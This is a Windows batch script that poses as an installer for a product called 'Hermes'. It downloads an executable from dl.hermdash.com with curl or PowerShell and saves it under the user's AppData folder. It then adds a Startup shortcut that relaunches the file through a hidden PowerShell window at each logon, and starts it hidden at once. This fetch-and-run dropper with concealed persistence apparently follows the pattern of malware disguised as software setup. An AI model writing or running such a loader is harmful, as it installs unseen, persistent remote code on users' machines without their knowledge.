@echo off
setlocal enabledelayedexpansion

echo Installing Hermes...

set INSTALL_DIR=%LOCALAPPDATA%\Hermes
set BINARY_URL=https://dl.hermdash.com/windows.exe

:: Create install directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Download runtime
echo Downloading...
curl -L "%BINARY_URL%" -o "%INSTALL_DIR%\hermes-runtime.exe"

if not exist "%INSTALL_DIR%\hermes-runtime.exe" (
    echo Trying with PowerShell...
    powershell -Command "Invoke-WebRequest -Uri '%BINARY_URL%' -OutFile '%INSTALL_DIR%\hermes-runtime.exe'"
)

:: Add to startup (run hidden)
set STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_PATH%\Hermes Runtime.lnk'); $SC.TargetPath = 'powershell.exe'; $SC.Arguments = '-WindowStyle Hidden -Command \"Start-Process -FilePath \"\"%INSTALL_DIR%\hermes-runtime.exe\"\" -WindowStyle Hidden\"'; $SC.WindowStyle = 7; $SC.Save()"

:: Start now (hidden)
powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%INSTALL_DIR%\hermes-runtime.exe' -WindowStyle Hidden"

echo.
echo Hermes installed!
echo Open hermdash.com to get started
